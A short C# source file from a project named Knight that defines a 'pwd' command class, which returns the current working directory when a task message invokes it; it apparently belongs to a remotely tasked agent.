using Knight.Models.Raven;
using System.IO;

namespace Knight.Commands
{
    public class PrintWorkingDirectory : KnightCommand
    {
        public override string Name => "pwd";

        public override string Execute(TaskMessage task)
        {
            return Directory.GetCurrentDirectory();
        }
    }
}